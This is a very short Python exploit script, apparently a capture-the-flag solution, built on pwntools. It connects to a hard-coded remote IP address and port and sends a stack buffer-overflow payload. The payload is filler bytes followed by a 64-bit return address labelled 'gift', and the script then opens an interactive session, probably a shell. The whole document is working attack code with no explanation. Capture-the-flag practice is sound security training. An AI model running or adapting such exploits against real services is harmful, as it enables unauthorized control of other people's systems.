from pwn import *
pro=remote('175.178.183.208',21305)
gift=0x4005B6
payload = b'a'*16+b'b'*8+p64(gift)
pro.sendline(payload)
pro.interactive()